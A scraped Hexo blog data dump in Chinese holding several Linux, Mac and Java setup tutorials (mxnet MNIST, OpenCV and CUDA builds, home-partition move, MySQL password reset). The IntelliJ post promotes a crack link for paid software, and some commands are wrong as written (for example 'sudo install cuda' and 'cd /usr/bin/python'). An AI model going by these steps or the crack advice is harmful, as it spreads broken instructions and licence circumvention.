本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 前言最近搭建起了深度学习环境，mxnet被亚马逊钦定为官方的机器学习库，加上mxnet快速，代码清晰的特点，我赶紧乘上了mxnet快车，准备以mxnet为基础开始一些理论研究和产品实现。然而….mxnet搭建过程还是有点麻烦的，尤其是对于对编译过程不是非常熟悉的同学，这一点和caffe有点像，不过这不是问题，在本博客前面几篇文章对此有一个专门的教程，大家可以去看看，欢迎评论转载。这篇文章是mxnet开车教程的第一弹，让我们从果蝇数据集开始下手。 开车！二话不多说，开始开车，作为一名深度学习老司机，我们应该要学会果蝇数据集的正确下载方式，我这里就不贴了，去Lecun的官网下载。下载之后解压，你将会看到四个文件：t10k-images.idx3-ubytet10k-labels.idx1-ubytetrain-images.idx3-ubytetrain-labels.idx1-ubyte 这就是训练集和测试集的数据和标签，很多人一看不知道这是什么鬼，其实我也不知道这是什么鬼，反正是一种文件格式就对了。不多说了直接上代码，开车之前先导入包：import structimport numpy as npimport matplotlib.pyplot as pltimport mxnet as mximport logginglogging.getLogger().setLevel(logging.DEBUG) 哪个包缺少安装哪个，玩mxnet你不要告诉我你还没有安装mxnet，快去我的另外一片博文看教程安装。 读取mnist数据集的正确姿势接下来我有必要传授大家读取mnist数据集的正确方式了，网上流传的各种方法都是瞎扯淡，不懂得科学内涵（手动装逼）。正确的读取方式我谢了两个函数，一个读取label，一个读取image：def read_mnist_label(file_name): bin_file = open(file_name, 'rb') magic, num = struct.unpack(\"&gt;II\", bin_file.read(8)) label = np.fromstring(bin_file.read(), dtype=np.int8) return labeldef read_mnist_image(file_name): bin_file = open(file_name, 'rb') magic, num, rows, cols = struct.unpack(\"&gt;IIII\", bin_file.read(16)) image = np.fromstring(bin_file.read(), dtype=np.uint8).reshape(num, rows, cols) return image 将我们下载的文件传进去，就能得到label，images的输出，应该都是numpy.array的格式。 测试图片我们写个显示图片的函数把：def plot_image(image_array): plt.imshow(image_array, cmap='gray') plt.show() 输入图片矩阵，画出图片。val_img = read_mnist_image('t10k-images.idx3-ubyte')plot_image(val_img[0]) 这就把测试集的第一张图片显示出来了。 搭建mxnet网络这部分直接根据官网的来：batch_size = 100train_iter = mx.io.NDArrayIter(to4d(train_img), train_lbl, batch_size, shuffle=True)val_iter = mx.io.NDArrayIter(to4d(val_img), val_lbl, batch_size)data = mx.sym.Variable('data')data = mx.sym.Flatten(data=data)fc1 = mx.sym.FullyConnected(data=data, name='fc1', num_hidden=128)act1 = mx.sym.Activation(data=fc1, name='relu1', act_type=\"relu\")fc2 = mx.sym.FullyConnected(data=act1, name='fc2', num_hidden=64)act2 = mx.sym.Activation(data=fc2, name='relu2', act_type=\"relu\")fc3 = mx.sym.FullyConnected(data=act2, name='fc3', num_hidden=10)mlp = mx.sym.SoftmaxOutput(data=fc3, name='softmax')shape = &#123;\"data\": (batch_size, 1, 28, 28)&#125;# mx.viz.plot_network(symbol=mlp, shape=shape)model = mx.model.FeedForward( ctx=mx.gpu(0), symbol=mlp, num_epoch=4, learning_rate=0.1)model.fit( X=train_iter, eval_data=val_iter, batch_end_callback=mx.callback.Speedometer(batch_size, 200)) 预测最后最重要的部分来了，那就是预测：predict_img = val_img[0].astype(np.float32).reshape((1, 1, 28, 28))/255.0prob = model.predict(predict_img)[0]print('prob:', prob)print('Classified as &#123;0&#125; with probability &#123;1&#125;'.format(prob.argmax(), max(prob))) 输出结果如下：Classified as 7 with probability 0.9959895014762878 说明我们的预测准确度还是非常高的啊！","categories":[],"tags":[]},{"title":"Ubuntu下编译opencv并生成python链接库详细教程-吐血编译系列","slug":"Ubuntu下编译opencv并生成python链接库详细教程-吐血编译系列","date":"2016-12-03T02:20:47.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/03/Ubuntu下编译opencv并生成python链接库详细教程-吐血编译系列/","link":"","permalink":"http://yoursite.com/2016/12/03/Ubuntu下编译opencv并生成python链接库详细教程-吐血编译系列/","excerpt":"本文将解决的是opencv这个洪水猛兽，opencv功能强大，但是无论在ubuntu下还是在windows下编译都非常麻烦，本文将编译它，并生成python调用库。哥搞了好几天才搞定，shit！","text":"本文将解决的是opencv这个洪水猛兽，opencv功能强大，但是无论在ubuntu下还是在windows下编译都非常麻烦，本文将编译它，并生成python调用库。哥搞了好几天才搞定，shit！ 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 前言opencv3.1 Ubuntu16.04 python3.5 编译完成，python下可以直接调用。先说一下，编译源码并生成python可以调用的库，检查方法是看看是否在/usr/local/lib/python3.5/dist-packages下有cv2.python-35m-x86_64-linux-gnu.so的库，如果编译生成了，说明可以在python中调用使用了，其他语言应该也差不多，但是网上的一些教程要么过时要么没有提醒你注意重要步骤甚至有些教程还是啥鸡巴扯淡的，蛋疼，我把我配置编译的过程记录一些，让后来者少走一些弯路，如果一些地方你不注意真的很容易浪费时间在各种编译错误上。首先致谢这篇英文文章，人家外国人写博客说的很清楚，不像国人写个博客妈的缺胳膊少腿。 先说几句本教程主要是教大家在ubuntu16.04 上编译python3.5版本的opencv3.1，如果你要是其他系统或者python版本步骤应该差不多，但是一定要小心修改，多尝试。整个过程容易出错以及将会导致的错误我都会粗体警示，毕竟我是踩着坑过来的。在编译python版本的opencv库之前一定要安装numpy，特此提示，后面的步骤不包含这一步 安装过程Step1 各种apt先get一下，安装需要的依赖sudo apt updatesudo apt install build-essential cmake pkg-config 其中cmake是一定要安装的，apt是最简单的安装方式，pkg-config一般系统会自带，我们不管狂安装就是 Step2 安装opencv需要的图片编码库、视频编码库等库sudo apt-get install libavcodec-dev libavformat-dev libswscale-dev libv4l-devsudo apt-get install libxvidcore-dev libx264-devsudo apt-get install libatlas-base-dev gfortran 前面两句是安装以来的编码库，包括图片和视频，最后一行是安装优化算法库atlas。 Step3 极其重要的一步，安装python开发库，如果缺少这个步骤无法生成python的调用链接sudo apt-get install python2.7-dev python3.5-dev 这里python2.7和3.5一起安装了，防止后面有人要安装2.7的版本。 Step4 下载opencv源码文件cd ~git clone https://github.com/opencv/opencv.git 从这里下载最新的opencv版本，然后我们就会在home目录下看到opencv源代码文件了。 Step5 开始编译和安装cd opencvmkdir buildcd buildcmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D INSTALL_PYTHON_EXAMPLES=ON -D PYTHON_EXECUTABLE=/usr/bin/python -D WITH_CUDA=OFF -D BUILD_EXAMPLES=ON .. 在这里我要解释一下，cmake后面的参数非常重要，决定了编译是否可以成功，其中比较重要的两个参数：PYTHON_EXECUTABLE WITH_CUDA,前者是告诉编译程序你的pyton解释器的路径，这个路径默认就是你在terminal输入which python弹出的路径，不管是python2.7还是3.5都是这个路径，后面这个是说你编译的时候要不要用CUDA加速，反正我是没有编译成功，所以直接放弃了，如果你有CUDA配置好了，可以参考下面这条命令：cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D INSTALL_PYTHON_EXAMPLES=ON -D PYTHON_EXECUTABLE=/usr/bin/python -D CUDA_GENERATION=Auto -D BUILD_EXAMPLES=ON .. 参数CMAKE_BUILD_TYPE CMAKE_INSTALL_PREFIX是说你的cmake的安装路径，cmake默认是安装在/usr/local下的。ok，然后enter先cmake一下。在这个过程中你可能会遇到一些问题，一般可以百度到解决方案，比如可能会遇到一个问题就是提示没有ippicv文件，说是文件校验码不对，这个时候莫慌，直接从网上搜索ippicv这个文件放到opencv/3rdparty/ippicv下即可，同时build文件夹下也复制一个（build文件夹和opencv下的目录结果一样的），然后在cmake就没有问题了。OK，接着我们makemake -j8 这个时候有问题就百度一下，都能解决，一般情况下不会遇到问题，只要你的cmake参数设置没有写错。完成之后在installsudo make install OK，我们这就编译好了opencv的库。 来玩一玩opencv千辛万苦终于编译好了，得好好玩玩这个opencv，这里哥带领大家玩一个牛逼点的例子：","categories":[],"tags":[]},{"title":"Ubuntu大手术-更换home的挂载分区获取更大空间","slug":"Ubuntu大手术-更换home的挂载分区获取更大空间","date":"2016-12-03T01:48:43.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/03/Ubuntu大手术-更换home的挂载分区获取更大空间/","link":"","permalink":"http://yoursite.com/2016/12/03/Ubuntu大手术-更换home的挂载分区获取更大空间/","excerpt":"Ubuntu系统安装时由于年少无知瞎几把设置分区，结果最后导致空间不够用，不过不用担心，本教程教你如何在不装系统的情况之下对分区进行修改","text":"Ubuntu系统安装时由于年少无知瞎几把设置分区，结果最后导致空间不够用，不过不用担心，本教程教你如何在不装系统的情况之下对分区进行修改 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 准备一个更大的分区首先当然最要紧的是准备一个更大的分区，这里我建议大家选择一个分区大小在50G以上的分区，作为开发人员是真的需要这么多空间，否则到后面又会不够用。（原则上当初安装系统的时候就应该root和home都设置为50G以上最好）更换分区大手术的思路是这样的： 将准备的新硬盘挂载到/media/home目录下 将原/home目录下的文件全部同步到/media/home目录下，这就相当于复制了一个home到新硬盘上 更改/media/home挂载为/home (可选)备份/home到/old_home以防不测 重启系统进入新home 开始备份工作接着我们打开/etc/fstab文件sudo gedit /etc/fstab 这时候你会发现这些东西：# &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# / was on /dev/sda11 during installationUUID=48d1bdc4-b4ab-4496-880c-0298135dbbf2 / ext4 errors=remount-ro 0 1# /boot was on /dev/sda12 during installationUUID=6dbeefea-6ea4-4ab7-8a75-5a91e5e5a45c /boot ext4 defaults 0 2# /boot/efi was on /dev/sda1 during installationUUID=0A0D-7DD0 /boot/efi vfat umask=0077 0 1# /home was on /dev/sda7 during installation#UUID=5d56eef4-8f46-40ab-8ace-50122eb0bc27 /home ext4 defaults 0 2# change home mount to size80G diskUUID=b5a9ca3a-fba0-46aa-9249-4fe8c94e2f9a /home ext4 defaults 0 2# swap was on /dev/sda6 during installationUUID=563897f4-5404-466d-953f-af78250e85d0 none swap sw 0 0 大家看我加粗的一行，这是我之前的home挂在分区，下面的是新的home分区，放到你的情况就应该先把原来的home分区设置注释掉，复制一行，以免出面出错忘记了初始设置，然后我们要查看一下自己硬盘的UUID，UUID查看方式，不能出错否则挂载就错了,新开一个terminal，输入以下代码来查看：sudo blkid 这时候你就应该可以看到/dev/sda11之类的后面带着UUID，你要重新挂载的硬盘在哪个sda呢，你直接用ubuntu系统的disk软件来看，然后找到对应的UUID，复制以下，再回到刚才打开的fstab文件：# (identifier) (location, eg sda5) (format, eg ext3 or ext4) (some settings)UUID=YOURUUID /media/home ext4 defaults 0 2 回到termminal，输入：sudo mkdir /media/homesudo mount -a 然后关机重启以下，记住这里要重启以下. 开机进入Ubuntu，这时候我们就把新硬盘挂载到了/media/home路径下，不信你可以去/media下面查看，是有一个home文件夹，这个对应的物理路径就是你的新硬盘或者新分区。 OK,我们完成了挂载工作，接下来把文件同步复制到新分区sudo rsync -aXS --progress --exclude='/*/.gvfs' /home/. /media/home/. 等待文件复制完成，需要蛮久。 更换为新的home挂载修改fstab文件，到这你就差一步了：sudo /etc/fstab 把之前我们加的/media/home修改为/home# (identifier) (location, eg sda5) (format, eg ext3 or ext4) (some settings)UUID=YOURUUID /home ext4 defaults 0 2 OK,重启，进入ubuntu你会发现所有的一切还和原来一样，打开nautilus，查看以下home分区发现空间变大了！这就是linux，你可以尽情的做手术依旧保持着健壮的生命力。","categories":[],"tags":[]},{"title":"Ubuntu下设置AndroidStudio的启动快捷方式","slug":"Ubuntu下设置AndroidStudio的启动快捷方式","date":"2016-12-02T12:52:03.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/02/Ubuntu下设置AndroidStudio的启动快捷方式/","link":"","permalink":"http://yoursite.com/2016/12/02/Ubuntu下设置AndroidStudio的启动快捷方式/","excerpt":"Ubuntu下设置AndroidStudio的快捷方式","text":"Ubuntu下设置AndroidStudio的快捷方式 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu Ubuntu下设置AndroidStudio快捷方式Ubuntu下安装AndroidStudio不需要多讲，直接下载deb包，然后安装，一般安装在/opt/文件夹下，但是有个问题无法生成快捷方式，这就非常蛋疼了。不过莫慌，这个问题也好解决，就是新建一个Desktop文件，具体操作如下：sudo gedit /usr/share/applications/AndroidStudio.desktop 打开这个文件拷贝下面的配置信息进去：[Desktop Entry] Name = Studio comment= android studio Exec=/opt/android-studio/bin/studio.sh Icon=/opt/android-studio/bin/studio.png Terminal=false Type=Application 这里，opt/下就是我的AndroidStudio安装路径。保存，然后：nautilus /usr/share/applications 打开这个文件夹，找到AndroidStudio快捷方式，拖入到侧边栏即可。","categories":[],"tags":[]},{"title":"Linux下开发大神装机命令大全-从娱乐到开发","slug":"Ubuntu下开发大神玩机命令大全-从娱乐到开发","date":"2016-12-01T10:55:15.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/01/Ubuntu下开发大神玩机命令大全-从娱乐到开发/","link":"","permalink":"http://yoursite.com/2016/12/01/Ubuntu下开发大神玩机命令大全-从娱乐到开发/","excerpt":"这篇文章是一个收藏集。","text":"这篇文章是一个收藏集。 我将列举在Ubuntu下所有遇到的命令行操作。在本篇文章收集的差不多的时候我将把所有命令整合为一个.sh文件，大家装机Ubuntu后可以选择对应的版本安装配置，从而节约大量配置一些环境的时间。暂时分为三个版本：娱乐版，开发版，极客版。 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 娱乐版面向普通大众，包括一些娱乐软件的安装如QQ，迅雷，Word，ubuntu主题美化软件等的安装，开发版则包括一些开发工具的安装，比如Cmake，g++，python3.5，java等环境的搭建，当然开发版在娱乐版的基础上的扩充，为了防止臃肿所以不放在一个版本；最后极客版是集成了深度学习、Java、Python、CUDA与一体的开发环境，对机器要求较高。更新以后安装Ubuntu系统一定记得如果做开发的话home分区分至少50G！！太小了尼玛分分钟满了，root分区也至少50G，否则以后修改分区真鸡巴，麻烦 Ubuntu装机命令之-娱乐版（麻瓜版）在这个版本我们将实现以下软件的安装和配置： Longue QQ wine 最新版本 迅雷替代软件-uget 主题美化软件-unity-tweak-tools 麻瓜版预装主题-macbuntu 麻瓜版预装图标-numbic-circle 终端美化-oh my zash chrome 浏览器 搜狗拼音输入法 for linux 网易云音乐 for linux 仿mac dock栏软件plank Ubuntu装机命令之-开发版开发版我们在娱乐版的基础之上，还将安装一下： Python3.5 Java 8 Atom Markdown 写作神器 Brackets 前端神器 opencv(这个我会单独开一个版本，其中还包括Cmake，g++等的安装) …陆续补充中 Ubuntu装机命令之-极客版最后极客版在开发版的基础之上，我们还将实现一下的安装： CUDA和CUDNN（前提是有支持的显卡） Mxnet的编译和安装 Tensorflow的安装 ….陆续补充中 具体安装代码集锦（方便大家拷贝代码段） CMake的安装首先大家前往官网下载cmake包，解压到Download路径下，然后把文件夹复制到/usr/local中我们安装在这里： sudo cp -r cmake-3.7.1 /usr/localcd /usr/local/cmake-3.7.1sudo ./bootstrapsudo makesudo make installcmake --version 更新其实cmake可以直接用apt来下载和安装，apt不行的情况下在使用上面的方法，apt办法为： sudo apt install cmake OpenCV的编译和安装，生成python版本 export PYTHON3_EXECUTABLE=/usr/bin/pythonexport PYTHON_INCLUDE_DIR=/usr/include/python3.5export PYTHON_INCLUDE_DIR2=/usr/include/x86_64-linux-gnu/python3.5export PYTHON_LIBRARY=/usr/lib/x86_64-linux-gnu/libpython3.5.soexport PYTHON3_NUMPY_INCLUDE_DIRS=/usr/lib/python3.5/dist-packages/numpy/core/include/ 接下来clone opencv源码，cd进入新建一个build文件夹，进入这个文件夹，执行：cmake -D CMAKE_BUILD_TYPE=bulid -D CMAKE_INSTALL_PREFIX=/usr/local -D CUDA_GENERATION=Kepler ..sudo make -j8sudo make install cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D INSTALL_PYTHON_EXAMPLES=ON -D OPENCV_EXTRA_MODULES_PATH=~/opencv_contrib-3.1.0/modules -D PYTHON_EXECUTABLE=/usr/bin/python -D BUILD_EXAMPLES=ON .. 这里由于我的电脑是有GPU的，而且安装了cuda，因此后面cmake的时候有一个参数为CUDA_GENERATION,我们选择Auto，如果不加这个就是编译CPU版本，但是我这里不加会报错，建议只用CPU的可以不加这个参数。这里，make -j8参数是指定多核编译，8是你的CPU核心数。 最后我会把源代码开源到github，欢迎大家前去使用把安装过程中遇到的错误开issue提出来，也欢迎大家fork然后pull自己的安装命令进来，把我们的命令大全不断的扩充，满足更多人的需要。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Ubuntu16.04搭建Mxnet惊天地泣鬼神完整教程,深度学习起航","slug":"Ubuntu16-04搭建Mxnet惊天地泣鬼神完整教程-深度学习起航","date":"2016-12-01T04:26:32.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/01/Ubuntu16-04搭建Mxnet惊天地泣鬼神完整教程-深度学习起航/","link":"","permalink":"http://yoursite.com/2016/12/01/Ubuntu16-04搭建Mxnet惊天地泣鬼神完整教程-深度学习起航/","excerpt":"本文将详细介绍Ubuntu16.04下使用CUDA和CUDNN搭建Mxnet的深度学习框架教程，其中最重要的还是CUDA和CUDNN的安装，通过本教程你可以节约很多时间，如果有什么不懂的在下面留下评论，我可以给予帮助","text":"本文将详细介绍Ubuntu16.04下使用CUDA和CUDNN搭建Mxnet的深度学习框架教程，其中最重要的还是CUDA和CUDNN的安装，通过本教程你可以节约很多时间，如果有什么不懂的在下面留下评论，我可以给予帮助 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 前言在写这篇文章之前，我有必要吐一下草，没有错说的就是windows，JB太麻烦了，可能是我不是搞C++的吧，之前也没有搭建过caffe所以觉得非常麻烦。一直以来都是python和java，感觉就单单opencv搭建来说python下和C++相比，python就简单很多，当然也可能是因为我不熟悉visual studio的缘故，总之就整体步骤来说，我明白了一个道理，珍爱生命原理windows，如果你是搞技术的话。 Ubuntu16.04 CUDA8 CUDNN for CUDA8 Mxnet好闲话不多说让我们直接开始，如前所述，在进行我们伟大的革命事业之前，请原理windows，windows作为日常办公使用不可或缺，但是就开发来讲我拒绝它，太麻烦了，还是喜欢我们伟大的Linux，所有事情一个命令行轻松搞定，当然如果读者对Linux不熟悉的话，你可以把它当成Mac OS，毕竟Unix和Linux五八年前本是一家，慢慢你就会对Ubuntu系统的简单便捷所折服，Ubuntu已经为你准备好了一切，接下来你直接进行你伟大的创造即可。所以说我们在进行革命之前，先安装Ubuntu系统，追求个性的你不需要安装最新版本，因为我就是踩着坑过来的，新版本对中文输出法支持不好有很多莫名其妙的bug，所以还是推荐现在比较稳定的16.04.当然很多人更加追求个性，直接使用其他发行版本，比如国产的深度，Solus，Elementory OS，听老夫一言，我是踩着坑过来的，这些系统即使界面在花骚，在Ubuntu面前还是图样图森破，散木谈慕斯奈一福。哎呀这废话有点多了，相信你已经按装好了Ubuntu。接下来就是显卡。就显卡这一快我又有必要吐槽一下了，NVIDIA尼玛把显卡买那么贵真的好吗，真的不是炒作起来的吗，我有点愤青了，这让我们这些想搞点事情的年轻人情何以堪。不过不重要相信各位土豪手里都已经有了New TITAN X，如果你手里只有一块入门级的显卡，不过也没有关系，本文使用的显卡就是入门级的，丝毫不妨碍我们继续我们改变世界的伟大计划，当然以后升级是必然的，我们先吧我们的理论知识打好。接下来你要安装的就是CUDA和CUDNN。在这里我详细介绍一下，因为CUDA和CUDNN有没有安装好决定了后面Mxnet GPU版本能不能使用。 CUDA8安装教程 前往官网下载CUDA 这里我放出一个CUDA的下载链接，但是机智的我为了骗取评论数决定采取大家评论私发的方式，嘿嘿嘿～ CUDA8安装 接下来相信你已经在/Downloads文件接下有了一个文件，我们安装它 sudo dpkg -i cuda-repo-ubuntu1604-8-0-rc_8.0.27-1_amd64.deb 后面使我们下载好的文件的名字。然而我们在从apt中安装cuda：sudo apt updatesudo install cuda 最后最重要的一部，得配置环境变量，如果在这一步没有配置环境变量的话，极有可能会出错。export CUDA_HOME=/usr/local/cuda 其实这样很简单，export是手动导入变量，如果接下来安装出错的话，首先输入命令：echo $CUDA_HOME 看看是不是环境变量配置出错了。这里我们刚才install cuda的时候实际上会在/usr/local/目录下生成cuda 和cuda-8.0两个文件夹，后面这个只是让我们知道cuda的版本，因为后面cudnn要和cuda版本配套，实际使用我们只是用cuda这个文件中的库。导入了cuda环境变量之后，我们还要手动导入cuda library的环境变量：export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH 然后我们echo一下$LD_LIBRARY_PATH,看看是否导入成功。OK，进行到这里我们就安装好了CUDA了，我们在terminal里面输入：nvcc --version 看看CUDA是否安装成功，如果出来了版本说明安装好了。 CUDNN安装 接下来安装CUDNN，这是加速卷积运算的库，最好安装一下，大家要去Nvidia官网下载，注册一个Nvidia的账号，不得不说，Nvidia的官网还是很有设计感的，这里我也放出一个下载链接，因为官网下载其实有点慢，猥琐的而又机智的我希望大家评论一下然后来上链接，嘿嘿嘿CUDNN安装就是直接解压，tar zxvf cudnn8.0-linux64-amd.tar.gz 后面那个是你下载的文件的名字，接着你要复制这些文件到cuda的目录里面去：sudo cp cuda/include/* /usr/local/cuda/include/sudo cp cuda/lib64/* /usr/local/cuda/lib64/ 这个意思就是把cudnn下面的文件复制到cuda相应的文件夹之下。这样我们就安装好了吧，是的如果还报什么错就贴出来，应该这里的问题很好解决。 安装Mxnet接下来我们要安装Mxnet了，首先大家直接去github克隆最新的代码git clone --recursive https://github.com/dmlc/Mxnet 那个–recursive命令前往别忘记了，因为mxnet有一些依赖，一起下载下来，这个时候我们会在home目录下看到mxnet，我们cd进去：cd ~/mxnet 这里就是mxnet，接下来我们要编译它，编译生成我们相应的python、R、Scala库。但是编译之前我们安装一下opencv，以防万一，安装opencv很简单直接在apt中安装即可。sudo apt install opencv 如果安装不成功，可以直接百度一下，我这里就不详细说了。重点来了，接下来我们要编译mxnet，我们把mxnet/make文件夹下的config.mk文件拷贝到mxnet根目录，sudo cp ~/mxnet/make/config.mk ~/mxnet 这段代码我们在mxnet文件目录执行，然后我们sudo gedit config.mk对文件进行一个编辑。把USE_CUDA改为1，这里更改方式参考网上一些教程，同时USE_CUDNN也改为1，因为我们要安装GPU版本，所以这些都使用上，如果你是安装CPU版本的话那juice非常简单了你不需要编译直接下来官方的库即可。然后我们开始编译：make -j8 这里8指的是CPU的核心数，你可以查看一下你的CPU的核心数，我的是8核的。等待编译完成接下来重点来了，我们进入到python目录cd /usr/bin/pythonpython3 setup.py install 这里就是直接用setup工具来安装我们编译好的python mxnet库，至于为什么是python3是因为我安装了python3.5，如果你用的是2.7直接python就好了。 开始深度学习之旅一切准备就绪，开始开车！我们进入mxnet的example文件夹，来跑一个简单的mnist看看速度如何：可以说速度非常之快啊！现在我们只是开车，等一下就是真正你比吊炸天的深度学习教程了！ 感谢大家阅读我的博客，本文永久更新地址: jinfagang.coding.me 也欢迎大家积极留言，让我看到你的存在","categories":[],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://yoursite.com/tags/深度学习/"}]},{"title":"Mac mysql 安装配置以及忘记初始密码的解决方法","slug":"Mac-mysql-安装配置以及忘记初始密码的解决方法","date":"2016-11-30T04:04:10.000Z","updated":"2017-01-12T11:47:11.000Z","comments":true,"path":"2016/11/30/Mac-mysql-安装配置以及忘记初始密码的解决方法/","link":"","permalink":"http://yoursite.com/2016/11/30/Mac-mysql-安装配置以及忘记初始密码的解决方法/","excerpt":"本文详细说明了mac下mysql的安装和配置，现在mysql出于安全考虑安装时会默认初始化一个随机密码，如果忘记了需要重置也可以从本文找到答案。","text":"本文详细说明了mac下mysql的安装和配置，现在mysql出于安全考虑安装时会默认初始化一个随机密码，如果忘记了需要重置也可以从本文找到答案。 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu Mac下mysql的安装（推荐使用dmg安装，避免不必要的麻烦）Mac下安装mysql可以直接去官网下载dmg安装包，但是速度实在是慢，如果大家需要下载链接可以在下面回复邮箱我会第一时间打给大家，当然也可以加入我们的欧曼开发者联盟QQ群：373987228，中国新一代计算机高手聚集地。好了闲话不多说我们直接看看如何安装。 首先这个mysql如果用dmg安装的话就是傻瓜一键式安装了，非常方便简单快捷。dmg安装包默认安装sql在了/usr/local文件目录下： 要重启或者停止mysql服务在设置中有： 可以说非常的简单方便快捷。好了接下来我们该干啥？安装好了对不对？我们在终端输入mysql发现并没有什么卵用啊。同志们莫慌，这是因为，你还没有吧mysql加入环境变量，怎么加也很简单。 Mysql加入环境变量我们在终端输入 vim ~/.bash_profile 我们在里面增加一行： export PATH=$PATH:/usr/local/mysql/bin 这就把mysql添加进了环境变量，后面我们就可以用这个目录下的命令了。 MySQL搭建好后忘记初始密码这是很多人遇到的问题，mysql安装时生成的密码又臭又长在终端输入根本看不到，很容易输错，而且很多时候我们搭建mysql的时候有妹子在旁边，跟妹子说话时就会忘记保存，这个时候我们就要重置密码了，在终端输入一下命令（先关闭mysql）： sudo mysqld_safe --skip-grant-tables 这里mysqld_safe的意思是让mysql进入安全模式（麻瓜也知道），后面—skip-grant-tables意思是不需要密码进入，很容易理解吧，可以说这行命令很重要，大家在必要的时候可以记住，（如果你第二次忘记密码，那么你用这个命令的时候要关闭mysqld服务，怎么关闭Google一下）接着： mysql -u root 然后就用SQL语句修改密码：UPDATE 2017.1.12 UPDATE mysql.user SET password=PASSWORD('yourpassword') WHERE User='root'; 这行命令应该改为：UPDATE mysql.user SET authentication_string=PASSWORD('root') WHERE user='root'; 因为在新版本mysql中默认保存用户名的密码表在数据库mysql下的user表中，密码保存字段变成了authentication_string OK!确定之后/c，然后exit退出，在开一个终端输入 mysql -u root -p 接着输入新密码就可以进入mysql啦~ 感谢大家阅读我的博客，本文永久更新地址: jinfagang.coding.me 也欢迎大家积极留言，让我看到你的存在","categories":[],"tags":[{"name":"web后台","slug":"web后台","permalink":"http://yoursite.com/tags/web后台/"}]},{"title":"Hexo如何在两台电脑上更新博客","slug":"Hexo如何在两台电脑上更新博客","date":"2016-11-29T13:15:10.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/11/29/Hexo如何在两台电脑上更新博客/","link":"","permalink":"http://yoursite.com/2016/11/29/Hexo如何在两台电脑上更新博客/","excerpt":"本文介绍如何用了两台电脑进行博客的更新和配置，这样你就可以在两台电脑上更新自己的博客啦！想一想就很激动啊有没有，先来演示一下，其实本人这个博客和我另外一个博客是同步更新的:jinfagang.coding.me 欢迎大家去踩踩","text":"本文介绍如何用了两台电脑进行博客的更新和配置，这样你就可以在两台电脑上更新自己的博客啦！想一想就很激动啊有没有，先来演示一下，其实本人这个博客和我另外一个博客是同步更新的:jinfagang.coding.me 欢迎大家去踩踩 两台电脑配置hexo首先废话不多说，你需要准备两台电脑，相信各位土豪都能做到。接下来你需要两个账号，什么？两个账号？我只想更新一个账号怎么办？没有关系不要慌张，我这个教程教授大家的是使用两个账号开两个博客，但是更新的内容是一样的，这样其实也没有什么不好，你以后甚至可以用两个博客展示两面的你呢。","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"JavaWeb-搭建环境上传图片到后台并存储","slug":"JavaWeb-搭建环境上传图片到后台并存储","date":"2016-11-29T07:33:26.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/11/29/JavaWeb-搭建环境上传图片到后台并存储/","link":"","permalink":"http://yoursite.com/2016/11/29/JavaWeb-搭建环境上传图片到后台并存储/","excerpt":"介绍使用intelliJ idea搭建JavaWeb开发环境，以及实现简单的Servlet，从此你就可以建立自己的服务器，结合安卓或者IPhone实现任何你想通过云来完成的工作啦！","text":"介绍使用intelliJ idea搭建JavaWeb开发环境，以及实现简单的Servlet，从此你就可以建立自己的服务器，结合安卓或者IPhone实现任何你想通过云来完成的工作啦！ 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ intellij idea Java web环境的搭建很久以来，很多人用eclipse，什么都是eclipse，java是，安卓是，甚至连C++都有人用eclipse，然而作为一个对技术和审美有着强烈追求的男人，是不能忍受eclipse古老的界面的，这时候我们就应该使用intellij idea，地球表面以上3000米高空一下最牛逼的ide，是的你没有听错，就是它。闲话不多说，让我们看看人家idea的启动界面： 简直狂月酷炫有没有。好吧其实我知道你们很多人知道，我就不装逼了，直接说重点吧。 说先对于一个web项目来说，你的idea一定要是Ultramate版本，也就是旗舰版，不知道这个单词写错没有，大家将就看，实际上intellij全系的专业版ide都可以破解，在这里放一个破解链接，大家需要的就是获取个注册码：获取注册码通道 好了同志们要开车了，有了idea我们就要开始搭建开发环境了，请注意本次火箭即将开车。 新建一个web工程 新建工程很简单，按照向导来，在选择页面我们选择webapp 然后给工程取一个名字，接下来我们可以看到idea已经帮我新建好了一个完成的web工程。这里我们还要新建两个文件夹，结构如图所示，先不要问为什么，等一下我会告诉大家。 